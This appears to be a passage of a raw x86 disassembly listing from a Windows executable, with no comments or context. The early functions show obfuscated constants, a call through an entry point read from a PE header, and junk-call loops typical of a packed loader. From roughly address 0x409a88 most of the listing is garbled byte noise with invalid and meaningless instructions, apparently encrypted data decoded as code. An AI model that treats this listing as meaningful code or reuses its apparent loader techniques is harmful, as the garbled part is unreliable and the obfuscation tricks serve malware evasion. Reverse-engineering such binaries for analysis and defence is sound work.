  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e7c4
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x43045d,0x14
  4098db:	cmp    DWORD PTR ds:0x43045d,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x43045d,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42ec33
  40991f:	mov    eax,ds:0x43045d
  409924:	dec    eax
  409925:	mov    ds:0x43045d,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x4304d7
  409934:	or     eax,DWORD PTR ds:0x4304df
  40993a:	mov    ds:0x4304d7,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e7d0,0x13
  40994c:	cmp    DWORD PTR ds:0x42e7d0,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e7d0,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42ec37
  409979:	mov    ecx,DWORD PTR ds:0x42e7d0
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e7d0,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x430449,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x430459,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x4304cf,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x4304cf
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x4304cf,edi
  4099bf:	cmp    DWORD PTR ds:0x4304cf,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x43043d
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42eac7
  4099e8:	cmp    DWORD PTR ds:0x4304cf,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x4304cf
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x4304cf,edi
  409a02:	cmp    DWORD PTR ds:0x4304cf,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x4304df,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x430435,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x430435
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x430435,ebx
  409a35:	cmp    DWORD PTR ds:0x430435,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42ea03
  409a50:	cmp    DWORD PTR ds:0x430435,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x430435
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x430435,ebx
  409a6a:	cmp    DWORD PTR ds:0x430435,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e7c8
  409a7d:	or     DWORD PTR ds:0x42edcb,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	fadd   DWORD PTR [esp+ecx*2+0x7edc598a]
  409a9b:	jle    0x409acb
  409a9d:	jge    0x409b1d
  409a9f:	jle    0x409aa4
  409aa1:	inc    edx
  409aa2:	aaa    
  409aa3:	xor    edx,DWORD PTR ds:0x1a210cb1
  409aa9:	and    DWORD PTR [edx+0xaad9859],esi
  409aaf:	(bad)  
  409ab1:	enter  0x66ed,0x6a
  409ab5:	adc    ch,bl
  409ab7:	cmc    
  409ab8:	xchg   edx,eax
  409ab9:	cmp    BYTE PTR ds:0xc1c7c952,ah
  409abf:	push   esp
  409ac0:	shr    BYTE PTR es:[esi-0x6f5e1f8c],cl
  409ac7:	and    eax,0xe4023187
  409acc:	sbb    DWORD PTR [ebx-0x3e],0xc28514fa
  409ad3:	arpl   cx,di
  409ad5:	push   ebx
  409ad6:	lock stos BYTE PTR es:[edi],al
  409ad8:	in     eax,dx
  409ad9:	or     DWORD PTR [ebp+0x19],0xffffffd0
  409add:	(bad)  
  409ade:	and    DWORD PTR [eax+0x4f59114e],esp
  409ae4:	xchg   edi,eax
  409ae5:	add    al,0xe0
  409ae7:	jmp    0xb101:0x30ad1f38
  409aee:	nop
  409aef:	dec    edx
  409af0:	test   BYTE PTR [edx],cl
  409af2:	pop    ds
  409af3:	hlt    
  409af4:	cld    
  409af5:	loop   0x409afd
  409af7:	jmp    0xa17330b3
  409afc:	test   BYTE PTR [edi],cl
  409afe:	push   0xffffffc7
  409b00:	arpl   WORD PTR [edi-0x1],ax
  409b03:	ins    DWORD PTR es:[edi],dx
  409b04:	(bad)  
  409b06:	daa    
  409b07:	xchg   edi,ebx
  409b09:	pop    ecx
  409b0a:	xchg   ebx,eax
  409b0b:	int    0x6e
  409b0d:	sbb    BYTE PTR [ebp+0x69],0x2f
  409b11:	neg    edx
  409b13:	dec    edi
  409b14:	jns    0x409b6a
  409b16:	pushf  
  409b17:	outs   dx,DWORD PTR ds:[esi]
  409b18:	mov    cl,0x6e
  409b1a:	cmp    ebp,DWORD PTR [ecx-0x4dc00d0e]
  409b20:	ficomp WORD PTR ss:[edx-0xd]
  409b24:	mov    edi,0x5c41125c
  409b29:	(bad)  
  409b2a:	daa    
  409b2b:	repz inc eax
  409b2d:	stos   BYTE PTR es:[edi],al
  409b2e:	pushf  
  409b2f:	pop    eax
  409b30:	ret    
  409b31:	sbb    esi,eax
  409b33:	push   esi
  409b34:	push   0xffffffdc
  409b36:	outs   dx,DWORD PTR ds:[esi]
  409b37:	repnz pop ebx
  409b39:	jbe    0x409b68
  409b3b:	mov    bl,0xf0
  409b3d:	inc    edi
  409b3e:	or     DWORD PTR [esi-0x305c6bd9],ebx
  409b44:	or     DWORD PTR [ebp-0x23],esp
  409b47:	rcl    BYTE PTR [eax-0x8],0xe1
  409b4b:	or     BYTE PTR [eax-0x1f216739],bl
  409b51:	pusha  
  409b52:	cmc    
  409b53:	ficom  DWORD PTR [ecx+0x4562dc79]
  409b59:	mov    dh,0xab
  409b5b:	shl    ecx,1
  409b5d:	fs aas 
  409b5f:	icebp  
  409b60:	pop    eax
  409b61:	adc    DWORD PTR [ecx-0x79],ebp
  409b64:	in     al,dx
  409b65:	popf   
  409b66:	and    al,0x17
  409b68:	leave  
  409b69:	daa    
  409b6a:	fidivr WORD PTR [edx-0x10112964]
  409b70:	jle    0x409b10
  409b72:	iret   
  409b73:	xchg   ebx,eax
  409b74:	mov    esi,DWORD PTR [edx+0x40]
  409b77:	pop    ds
  409b78:	mov    BYTE PTR [eax+esi*8+0x48954edc],0xf7
  409b80:	imul   ebp,DWORD PTR [ebx+0x471f3beb],0xa72d667c
  409b8a:	addr16 pop esi
  409b8c:	fist   DWORD PTR [edx-0x77e870b5]
  409b92:	push   cs
  409b93:	dec    esp
  409b94:	outs   dx,BYTE PTR ds:[esi]
  409b95:	cdq    
  409b96:	ss repnz push ebx
  409b99:	fwait
  409b9a:	pop    edx
  409b9b:	mov    WORD PTR [eax+0x37],es
  409b9e:	arpl   WORD PTR [ebx-0x767533c0],sp
  409ba4:	push   ebp
  409ba5:	cmp    BYTE PTR [ebp+0x49d08056],dl
  409bab:	or     bh,BYTE PTR [esi+0x4f8f5fb9]
  409bb1:	inc    BYTE PTR [eax+0x38]
  409bb4:	dec    edx
  409bb5:	popf   
  409bb6:	in     eax,dx
  409bb7:	or     BYTE PTR [ebx+edx*8],bl
  409bba:	dec    eax
  409bbb:	sub    eax,0x54679602
  409bc0:	mov    ecx,0xfa510461
  409bc5:	retf   
  409bc6:	jo     0x409b6f
  409bc8:	inc    ebx
  409bc9:	sub    al,0x85
  409bcb:	sbb    DWORD PTR [edx+0x3d],ecx
  409bce:	leave  
  409bcf:	dec    esp
  409bd0:	clc    
  409bd1:	cwde   
  409bd2:	jnp    0x409c1e
  409bd4:	adc    cl,al
  409bd6:	or     al,0x97
  409bd8:	cmp    BYTE PTR [edx+0x5d],0xa6
  409bdc:	inc    esi
  409bdd:	rcl    BYTE PTR [ebp-0x184e4949],cl
  409be3:	mov    eax,ds:0x4f61b1fa
  409be8:	jae    0x409bad
  409bea:	pop    ds
  409beb:	push   ss
  409bec:	sub    al,0x25
  409bee:	mov    ecx,DWORD PTR [esi+ebx*4-0x50e546]
  409bf5:	adc    DWORD PTR [ebp+eiz*8-0x2f],esi
  409bf9:	shr    dl,1
  409bfb:	mov    ecx,0xb9da9f97
  409c00:	xchg   ebp,eax
  409c01:	sahf   
  409c02:	mov    DWORD PTR [edi-0x13],eax
  409c05:	xor    eax,0xb60a43f9
  409c0a:	xchg   ebx,eax
  409c0b:	or     eax,0xfeee3a61
  409c10:	sub    eax,0x4ade37
  409c15:	mov    BYTE PTR [esi+ebp*2-0x58],ch
  409c19:	scas   eax,DWORD PTR es:[edi]
  409c1a:	bound  esi,QWORD PTR [edi+0x24e10de]
  409c20:	sahf   
  409c21:	jo     0x409bd5
  409c23:	mov    edi,0x9e09a259
  409c28:	and    BYTE PTR [edx-0x114f20fe],ch
  409c2e:	(bad)  
  409c30:	das    
  409c31:	cdq    
  409c32:	adc    al,0x97
  409c34:	pusha  
  409c35:	daa    
  409c36:	lods   eax,DWORD PTR ds:[esi]
  409c37:	xchg   edi,eax
  409c38:	lock std 
  409c3a:	scas   al,BYTE PTR es:[edi]
  409c3b:	xor    ebx,DWORD PTR [esi+edi*1-0x6b]
  409c3f:	cs jmp 0x409c28
  409c42:	inc    ebp
  409c43:	ds aas 
  409c45:	mov    ds:0x32035eab,eax
  409c4a:	cli    
  409c4b:	mov    edx,0x337c1199
  409c50:	sbb    edx,DWORD PTR [ecx]
  409c52:	xchg   edi,eax
  409c53:	push   ebx
  409c54:	adc    ebp,ebp
  409c56:	or     eax,0x86496037
  409c5b:	xchg   esi,eax
  409c5c:	mov    bh,0x43
  409c5e:	sbb    BYTE PTR [ebx+eiz*2-0x75364feb],bl
  409c65:	mov    BYTE PTR [eax+0x3],0x76
  409c69:	and    DWORD PTR [ebx+0x54527174],eax
  409c6f:	mov    bh,BYTE PTR [ebx+0x2cd3b744]
  409c75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c76:	push   cs
  409c77:	cwde   
  409c78:	(bad)  
  409c79:	jmp    0xbdef:0x5f1bdf2
  409c80:	repnz pop ecx
  409c82:	mov    dl,dl
  409c84:	xor    DWORD PTR [edi+0x73],eax
  409c87:	mov    ds:0xea39c0ad,al
  409c8c:	std    
  409c8d:	mov    edi,0x9df528b2
  409c92:	mov    eax,DWORD PTR [ebp+0x6e]
  409c95:	jns    0x409c9c
  409c97:	mov    edx,0xe4921b7
  409c9c:	push   esi
  409c9d:	xchg   ecx,eax
  409c9e:	call   0xb0d5:0xf82f9a74
  409ca5:	dec    esi
  409ca6:	push   0xffffffc0
  409ca8:	sbb    DWORD PTR [eax-0x5a],0xfffffff4
  409cac:	addr16 xchg ebx,eax
  409cae:	data16 and al,BYTE PTR [esi-0x1f]
  409cb2:	mov    ebx,0x469ebef7
  409cb7:	(bad)  
  409cb8:	fistp  DWORD PTR [edx-0x65e86cbf]
  409cbe:	fistp  WORD PTR [ebx-0x2759ab7f]
  409cc4:	jae    0x409cf0
  409cc6:	mov    ds:0xc3b68aee,al
  409ccb:	inc    esp
  409ccc:	mov    BYTE PTR [edx+0x658e500],ch
  409cd2:	mov    bl,0x7d
  409cd4:	mov    ebp,ebx
  409cd6:	cmova  ecx,DWORD PTR [eax]
  409cd9:	aad    0x24
  409cdb:	jmp    0xd9c4deef
  409ce0:	adc    DWORD PTR [edx],ebx
  409ce2:	pop    edi
  409ce3:	mov    WORD PTR [ecx-0x3c],gs
  409ce6:	inc    esi
  409ce7:	fldcw  WORD PTR [edi]
  409ce9:	push   esp
  409cea:	sub    DWORD PTR [ecx+ebp*1+0x5f],ecx
  409cee:	push   edi
  409cef:	mov    esi,0xeea2a724
  409cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cf5:	jle    0x409c8f
  409cf7:	cmp    edx,DWORD PTR [esi+0x48b6a1a9]
  409cfd:	pop    esp
  409cfe:	jl     0x409d07
  409d00:	push   ss
  409d01:	push   edx
  409d02:	jbe    0x409cfe
  409d04:	fstp   DWORD PTR [edx-0x67]
  409d07:	fdiv   QWORD PTR [eax+0x75]
  409d0a:	loopne 0x409d0c
  409d0c:	push   edx
  409d0d:	cmp    eax,0x8b56a73
  409d12:	sbb    ebx,esi
  409d14:	sti    
  409d15:	loop   0x409cc5
  409d17:	dec    edx
  409d18:	imul   edi,DWORD PTR [ebx-0x4a],0x1
  409d1c:	scas   al,BYTE PTR es:[edi]
  409d1d:	out    dx,eax
  409d1e:	(bad)  
  409d1f:	into   
  409d20:	xchg   edx,eax
  409d21:	(bad)  [ebp-0x617829b3]
  409d27:	loopne 0x409d26
  409d29:	das    
  409d2a:	jo     0x409d28
  409d2c:	sar    BYTE PTR [ebp-0x4e70ae4c],cl
  409d32:	pmovmskb edx,mm0
  409d35:	mov    eax,ds:0xc64d4415
  409d3a:	(bad)  
  409d3b:	pop    ss
  409d3c:	mov    dl,0x40
  409d3e:	mov    ch,BYTE PTR [ebx-0x20]
  409d41:	mov    cl,0x8c
  409d43:	and    dl,BYTE PTR [eax+0x3b]
  409d46:	ss pushf 
  409d48:	bound  ebx,QWORD PTR [ecx-0x16]
  409d4b:	jae    0x409d83
  409d4d:	js     0x409ceb
  409d4f:	sahf   
  409d50:	ret    0x2f9c
  409d53:	jmp    0xe47a:0xc0bae5f4
  409d5a:	jp     0x409d46
  409d5c:	or     DWORD PTR [eax+ebx*8+0x2c],0xffffffa4
  409d61:	lock outs dx,DWORD PTR ds:[esi]
  409d63:	retf   0xb3ff
  409d66:	stos   DWORD PTR es:[edi],eax
  409d67:	mov    ds:0x836a872,eax
  409d6c:	sub    ebp,DWORD PTR [esi-0x59]
  409d6f:	cmc    
  409d70:	std    
  409d71:	(bad)  
  409d72:	dec    ebx
  409d73:	fnstenv [edi+ebp*8+0x71c6594d]
  409d7a:	push   esi
  409d7b:	dec    edi
  409d7c:	jnp    0x409d08
  409d7e:	pop    edx
  409d7f:	mov    bl,0xdd
  409d81:	pop    eax
  409d82:	push   edx
  409d83:	fs pop eax
  409d85:	xor    eax,0x8ddfb3da
  409d8a:	sub    DWORD PTR [ebp+0x64],ebx
  409d8d:	in     al,0x9e
  409d8f:	neg    BYTE PTR [edi-0x2]
  409d92:	fisub  DWORD PTR [ebx+0x8]
  409d95:	inc    eax
  409d96:	cs std 
  409d98:	xor    eax,0x65f7bd4c
  409d9d:	nop
  409d9e:	xchg   BYTE PTR [eax-0x8],bh
  409da1:	stos   BYTE PTR es:[edi],al
  409da2:	mov    ebx,0x43bd2ed8
  409da7:	pop    esi
  409da8:	pop    ebx
  409da9:	icebp  
  409daa:	mov    ah,0xaa
  409dac:	push   es
  409dad:	fs inc ecx
  409daf:	push   edi
  409db0:	in     al,dx
  409db1:	arpl   WORD PTR [ecx+0x191c5da9],bp
  409db7:	xchg   ebx,eax
  409db8:	sub    ch,BYTE PTR [edx]
  409dba:	or     dl,BYTE PTR fs:[ebx+0x73dd9b33]
  409dc1:	push   edi
  409dc2:	xchg   ebx,eax
  409dc3:	cmp    BYTE PTR [ecx+0x6556d3ba],dl
  409dc9:	push   es
  409dca:	sub    bh,BYTE PTR [edi-0x449bec48]
  409dd0:	add    eax,edi
  409dd2:	mov    ebx,DWORD PTR ds:0x42e7d8
  409dd8:	add    ebx,DWORD PTR ds:0x4304d7
  409dde:	mov    DWORD PTR ds:0x42e7d8,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x43045d,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x4304cf,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x430451
  409e03:	and    DWORD PTR ds:0x430471,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x43044d,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409de2
  409e2b:	scas   eax,DWORD PTR es:[edi]
  409e2c:	jae    0x409e87
  409e2e:	or     eax,ebx
  409e30:	jle    0x409eb0
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409dff
  409e37:	call   0xcc768b46
  409e3c:	cwde   
  409e3d:	(bad)  
  409e3e:	mov    ebx,0xf67fb13e
  409e43:	xor    eax,0x74a3b90d
  409e48:	jecxz  0x409df0
  409e4a:	xchg   esi,eax
  409e4b:	and    al,0x71
  409e4d:	outs   dx,BYTE PTR ds:[esi]
  409e4e:	xchg   edx,eax
  409e4f:	nop
  409e50:	sub    BYTE PTR [ecx-0x14],0xe4
  409e54:	dec    ebp
  409e55:	ret    
  409e56:	mov    edi,0x6d7abed5
  409e5b:	jnp    0x409e96
  409e5d:	sbb    al,0x61
  409e5f:	sbb    al,0xf8
  409e61:	lds    ebp,FWORD PTR [edi]
  409e63:	arpl   WORD PTR [ecx-0x7c],bx
  409e66:	pop    edx
  409e67:	add    ebx,DWORD PTR [edx]
  409e69:	into   
  409e6a:	jmp    0x7af84f45
  409e6f:	xor    eax,0x1a5a6afd
  409e74:	adc    al,0x88
  409e76:	xlat   BYTE PTR ds:[ebx]
  409e77:	or     DWORD PTR [eax+0x1b0a3d31],edi
  409e7d:	mov    BYTE PTR [edx-0x6c],ah
  409e80:	dec    esi
  409e81:	(bad)  
  409e82:	mov    bh,0x51
  409e84:	sbb    eax,0xf7626402
  409e89:	jg     0x409e37
  409e8b:	push   edx
  409e8c:	pop    es
  409e8d:	cmc    
  409e8e:	lods   eax,DWORD PTR ds:[esi]
  409e8f:	mov    edi,ebx
  409e91:	sub    ch,ch
  409e93:	mov    esp,0x66aead31
  409e98:	sub    BYTE PTR [ebx],ch
  409e9a:	dec    eax
  409e9b:	ss sbb eax,eax
  409e9e:	pushf  
  409e9f:	add    al,BYTE PTR [edi+eiz*8-0x5bed06b4]
  409ea6:	aam    0xd1
  409ea8:	addr16 into 
  409eaa:	ret    
  409eab:	(bad)  
  409eac:	dec    esi
  409ead:	xlat   BYTE PTR ds:[ebx]
  409eae:	dec    ebp
  409eaf:	ror    esi,cl
  409eb1:	ins    BYTE PTR es:[edi],dx
  409eb2:	push   eax
  409eb3:	iret   
  409eb4:	jns    0x409f2c
  409eb6:	mov    WORD PTR [ecx],fs
  409eb8:	mov    dl,0x5e
  409eba:	mov    dl,0xb9
  409ebc:	sbb    BYTE PTR [edx+edx*4],0x8
  409ec0:	jp     0x409f3e
  409ec2:	jo     0x409ef4
  409ec4:	or     al,0xc1
  409ec6:	iret   
  409ec7:	dec    ecx
  409ec8:	add    eax,0xa77e45bc
  409ecd:	sub    bh,BYTE PTR [edx+esi*2-0x34]
  409ed1:	(bad)  
  409ed2:	dec    esp
  409ed3:	sub    ebx,DWORD PTR [esi]
  409ed5:	sbb    bh,BYTE PTR [edi+0x20]
  409ed8:	and    DWORD PTR [edi-0x3f],edx
  409edb:	sub    ebp,DWORD PTR [ecx+0x77]
  409ede:	(bad)  
  409edf:	js     0x409f51
  409ee1:	out    dx,al
  409ee2:	inc    esi
  409ee3:	nop
  409ee4:	inc    ebx
  409ee5:	ds ja  0x409e9e
  409ee8:	sbb    eax,0x5fa720ad
  409eed:	sbb    eax,0xc647ef95
  409ef2:	cmp    DWORD PTR [ecx-0x398df209],ecx
  409ef8:	mov    ch,0x56
  409efa:	in     eax,dx
  409efb:	add    edx,esi
  409efd:	mov    ebp,?
  409eff:	adc    bl,BYTE PTR [esp+ebp*1-0x7b]
  409f03:	or     ah,ah
  409f05:	and    esp,DWORD PTR [esi]
  409f07:	mov    dh,0x33
  409f09:	mov    ecx,0xba8f63e9
  409f0e:	push   edx
  409f0f:	mov    cl,0x6
  409f11:	fldcw  WORD PTR ds:0x420e9301
  409f17:	cwde   
  409f18:	ins    BYTE PTR es:[edi],dx
  409f19:	cwde   
  409f1a:	dec    ebp
  409f1b:	int3   
  409f1c:	xchg   ecx,eax
  409f1d:	mov    ch,0x9
  409f1f:	imul   edx,DWORD PTR ds:0x5472855f,0x669cc320
  409f29:	jp     0x409f42
  409f2b:	xor    eax,DWORD PTR [ebp-0x24]
  409f2e:	ror    DWORD PTR [ecx],0x23
  409f31:	or     DWORD PTR [edi-0x51a15f53],ebx
  409f37:	jg     0x409f0b
  409f39:	stc    
  409f3a:	cli    
  409f3b:	cdq    
  409f3c:	(bad)  
  409f3d:	outs   dx,BYTE PTR ds:[esi]
  409f3e:	jmp    0x41bda982
  409f43:	cld    
  409f44:	rcl    DWORD PTR [edx],0x70
  409f47:	or     eax,0x38be6161
  409f4c:	cmp    BYTE PTR [eax],cl
  409f4e:	(bad)  
  409f4f:	cwde   
  409f50:	jge    0x409f3d
  409f52:	xchg   edi,eax
  409f53:	jmp    FWORD PTR [ecx+ebx*4-0x21012e13]
  409f5a:	scas   al,BYTE PTR es:[edi]
  409f5b:	rcr    esp,0x1c
  409f5e:	cs adc esp,eax
  409f61:	mov    bh,0x91
  409f63:	cld    
  409f64:	daa    
  409f65:	push   cs
  409f66:	sub    BYTE PTR [ebp+0x2ae1d3c9],ah
  409f6c:	int    0x4a
  409f6e:	pop    ds
  409f6f:	cld    
  409f70:	jbe    0x409fb4
  409f72:	mov    ebp,0x5139d5a1
  409f77:	and    DWORD PTR [ebp+0x7c68230e],edi
  409f7d:	and    DWORD PTR [edi],0x450125a9
  409f83:	bsr    ecx,DWORD PTR ds:0x6c1fc874
  409f8a:	push   0x5
  409f8c:	imul   ebp,eax,0xc1d8e494
  409f92:	jne    0x409fa0
  409f94:	push   cs
  409f95:	enter  0xd79,0x30
  409f99:	dec    esi
  409f9a:	cmp    bh,BYTE PTR [edi+0x432a85a4]
  409fa0:	scas   al,BYTE PTR es:[edi]
  409fa1:	adc    esp,esi
  409fa3:	dec    edi
  409fa4:	jno    0x409fb2
  409fa6:	push   ebx
  409fa7:	mov    cl,0x5e
  409fa9:	imul   ebx,DWORD PTR [ebp-0x66],0xffffffe0
  409fad:	sub    BYTE PTR [ecx],ah
  409faf:	ret    0x2e28
  409fb2:	loopne 0x409f56
  409fb4:	retf   
  409fb5:	out    0x93,eax
  409fb7:	dec    esi
  409fb8:	mov    al,ds:0xdbf1927
  409fbd:	enter  0xaeba,0x5e
  409fc1:	addr16 mov edx,0x74239ad9
  409fc7:	mov    esi,0x10a21b2e
  409fcc:	dec    ebp
  409fcd:	inc    eax
